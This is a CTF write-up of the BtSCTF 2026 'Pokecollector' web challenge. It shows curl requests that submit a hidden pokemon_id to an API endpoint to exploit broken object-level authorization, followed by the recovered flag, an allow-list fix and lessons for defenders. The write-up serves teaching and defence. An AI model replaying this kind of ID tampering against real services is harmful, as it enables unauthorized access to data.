---
title: "BtSCTF 2026: Pokecollector Writeup — IDOR Through a Self-Issuing JWT"
slug: "btsctf-2026-pokecollector"
description: "BreakTheSyntax 2026 Pokecollector walkthrough — a 'gotta catch 'em all' web app trusts a client-supplied pokemon_id on POST /api/collection/add, re-issues the user's JWT with the unauthorised entry, and on read overwrites the name with a server-controlled value that turns out to be the flag for #150."
date: 2026-05-16T01:00:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags: ["btsctf", "breakthesyntax", "web exploitation", "idor", "broken access control", "jwt", "api security", "owasp"]
series: ["BreakTheSyntax CTF 2026"]
keywords: ["btsctf 2026 pokecollector writeup", "pokecollector writeup", "idor jwt writeup", "client supplied id idor", "broken access control api"]
toc: true
cover:
  image: "/images/articles/btsctf-2026-pokecollector.png"
  alt: "BtSCTF 2026 POKECOLLECTOR writeup — CTF challenge breakdown"
---

{{< ctf-meta platform="BreakTheSyntax CTF 2026" difficulty="Easy" os="Web" skills="IDOR, JWT, OWASP API1:2023 Broken Object Level Authorization" >}}

**BtSCTF 2026**'s Pokecollector — dissected in this **CyberSecurity Elite** walkthrough — is the kind of web challenge that sits right inside the [OWASP API Top 10](/web-security/owasp-top-10-2021-complete-guide/)'s number one slot — **API1:2023 Broken Object Level Authorization**. The application enforces its access rules in the UI and forgets to enforce them on the API. The fix is a single server-side validation; the cost of missing it is a leaked flag.

Source: [Abdelkad3r/BreakTheSyntax-ctf-2026 · Pokecollector.md](https://github.com/Abdelkad3r/BreakTheSyntax-ctf-2026/blob/main/Pokecollector.md).

## The Application

A "gotta catch 'em all" web app: register, log in, hit a button to add a Pokémon to your collection, view the collection. The set of Pokémon the UI exposes is small — Pikachu, Charmander, a handful of others — and conspicuously **does not include Mewtwo (#150)**, the most iconic legendary in the original Pokédex. That absence is the dangle.

Looking at the API surface in DevTools:

- `POST /api/collection/add` — body `{"pokemon_id": <int>, "pokemon_name": "<string>"}`. Both fields client-supplied.
- `GET /api/collection` — returns `[{ "id": <int>, "name": "<string>" }, ...]`
- After every successful add, the server **re-issues the user's JWT** with the updated collection embedded in it.

Two design choices to notice:

1. The catch endpoint accepts a raw integer ID with no allow-list check.
2. The JWT becomes a *mirror* of whatever IDs the user has managed to insert — there's no second, authoritative store the server checks against on read.

That combination is the entire bug.

## Reconnaissance

A quick test confirms the missing check. After logging in, swap the UI's pre-set ID for an arbitrary number and replay:

{{< terminal title="kali ~/ctf/pokecollector" >}}
$ curl -s -X POST https://challenge.local/api/collection/add \
       -H "Authorization: Bearer $JWT" \
       -H "Content-Type: application/json" \
       -d '{"pokemon_id": 25, "pokemon_name": "Pikachu"}'
{"token": "eyJhbGc...", "collection": [{"id":25,"name":"Pikachu"}]}
{{< /terminal >}}

The response includes a brand-new JWT with the entry baked in. The server is acting as its own authority on what the user owns — the JWT *is* the collection record.

{{< callout type="warning" title="Why self-issued JWTs are dangerous as state stores" >}}
Treating a JWT as the source of truth for what a user owns is a recurring anti-pattern. The token is signed, yes — but the *contents* are whatever the server put in last. If the server's "put in" path is wrong (as it is here), the signature only attests that the server itself created the wrong claim. Authoritative state should live in the database; JWTs should reference it, not embody it.
{{< /callout >}}

## Exploitation

Submit `pokemon_id: 150` — the ID the UI hid:

{{< terminal title="kali ~/ctf/pokecollector" >}}
$ curl -s -X POST https://challenge.local/api/collection/add \
       -H "Authorization: Bearer $JWT" \
       -H "Content-Type: application/json" \
       -d '{"pokemon_id": 150, "pokemon_name": "Mewtwo"}'
{"token": "eyJhbGc...","collection":[...,{"id":150,"name":"Mewtwo"}]}
{{< /terminal >}}

Accepted. Now fetch the collection back:

{{< terminal title="kali ~/ctf/pokecollector" >}}
$ curl -s https://challenge.local/api/collection \
       -H "Authorization: Bearer $JWT" | jq '.collection[] | select(.id == 150)'
{
  "id": 150,
  "name": "BtSCTF{g1t_g0tt4_c4tch_3m_4ll}"
}
{{< /terminal >}}

The `pokemon_name` we submitted (`"Mewtwo"`) was a decoy. On read the server overwrites it with its own canonical name from server-side data — and the canonical name for #150 has been swapped out for the flag. The bug isn't just that we could write the ID; it's that the server-controlled read path was the channel delivering the secret.

## Flag

```
BtSCTF{g1t_g0tt4_c4tch_3m_4ll}
```

## Why this works (and how to fix it)

The vulnerability is textbook **Broken Object Level Authorization** with a small twist:

- *Standard IDOR*: server returns object whose ID the client supplied, no check that the user owns it.
- *This variant*: server lets the client *insert* an arbitrary object ID into the user's own collection, then returns server-side data for that ID on read.

The fix is a single allow-list check at the catch endpoint:

```python
ALLOWED_POKEMON_IDS = {1, 4, 7, 25, ...}    # the IDs the UI actually exposes

@app.post("/api/collection/add")
def add(req, user):
    pokemon_id = req.json["pokemon_id"]
    if pokemon_id not in ALLOWED_POKEMON_IDS:
        return abort(403)
    user.collection.add(pokemon_id)
    ...
```

A deeper fix abandons "JWT as collection store" entirely — collections belong in a database row, and the JWT carries only the user identifier. Re-issuing tokens after every state change is a tell that the data model is in the wrong place.

## Lessons learned

1. **The UI is not a security boundary.** Anything the UI omits is still in the API's argument space. If you find an enumeration shown to the user, try the *complement* — the IDs the UI deliberately hides are often where the gold is.

2. **Client-supplied identifiers always need server-side authorization.** "Does this user own / can this user access / is this an ID the user is allowed to operate on" is a check that lives on the server, every single endpoint, no exceptions. OWASP API1:2023 is the most common API vulnerability for the third year running because this check gets skipped routinely.

3. **Self-issuing JWTs cannot enforce authorization on themselves.** Whatever the server puts in, the server signs. If you trust the JWT contents on read because they're signed, you're trusting your own write path — which means you have exactly one chance to validate inputs, on write. A defense-in-depth read-time check against an authoritative store catches the rest.

4. **Decoy fields are a signal.** The `pokemon_name` parameter was completely ignored — the server overwrote it on every read. When you see fields the server doesn't seem to use, look for fields it *does* use that are missing from the documentation.

## References

- [OWASP API Security Top 10 — API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [OWASP Top 10 (2021): The Complete Guide With Examples](/web-security/owasp-top-10-2021-complete-guide/) — A01 Broken Access Control covers the web-app variant
- [PortSwigger — Insecure Direct Object References](https://portswigger.net/web-security/access-control/idor)
- Source writeup: [BreakTheSyntax-ctf-2026/Pokecollector.md](https://github.com/Abdelkad3r/BreakTheSyntax-ctf-2026/blob/main/Pokecollector.md)
